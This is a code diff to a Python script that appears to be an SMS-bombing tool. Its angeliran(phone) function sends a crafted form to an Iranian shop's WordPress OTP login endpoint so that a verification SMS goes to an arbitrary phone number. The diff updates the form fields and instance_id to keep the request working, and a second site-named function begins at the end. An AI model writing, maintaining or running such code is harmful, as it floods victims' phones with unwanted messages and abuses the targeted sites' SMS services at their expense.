@@ -62,14 +62,19 @@ def angeliran(phone):
             "action_type": "phone",
             "digits_reg_name": "نام",
             "digits_process_register": "1",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
             "digits": "1",
-            "instance_id": "3ca4d54662e429573f577c799f4356b3",
+            "instance_id": "6f8ca37725ee2166c8fc02c16e17a299",  # instance_id جدید
             "action": "digits_forms_ajax",
             "type": "login",
             "digits_redirect_page": "https://angeliran.com/my-account/",
             "digits_form": "23837de77d",
             "_wp_http_referer": "/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
-            "show_force_title": "1"
+            "show_force_title": "1",
+            "container": "digits_protected",  # اضافه شده
+            "sub_action": "sms_otp"  # اضافه شده
         }
         
         headers = {
@@ -82,30 +87,19 @@ def angeliran(phone):
         
         response = requests.post(url, data=payload, headers=headers, timeout=10)
         
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
-        
         if response.status_code == 200:
-            try:
-                response_data = response.json()
-                if response_data.get("success") is True:
-                    print(f'{g}(angeliran) {a}Code Sent')
-                    return True
-                else:
-                    print(f'{r}[-] (angeliran) API Error: {response_data}{a}')
-                    return False
-            except:
-                if "1" in response.text or "success" in response.text.lower():
-                    print(f'{g}(angeliran) {a}Code Sent')
-                    return True
+            response_data = response.json()
+            if response_data.get("success") is True:
+                print(f'{g}(angeliran) {a}Code Sent')
+                return True
         
-        print(f'{r}[-] (angeliran) HTTP Error: {response.status_code}{a}')
+        print(f'{r}[-] (angeliran) Failed{a}')
         return False
             
-    except Exception as e:
-        print(f'{r}[!] angeliran Exception: {e}{a}')
+    except Exception:
+        print(f'{r}[-] (angeliran) Failed{a}')
         return False
-
+        
 
 def mahabadperfume(phone):
     import requests
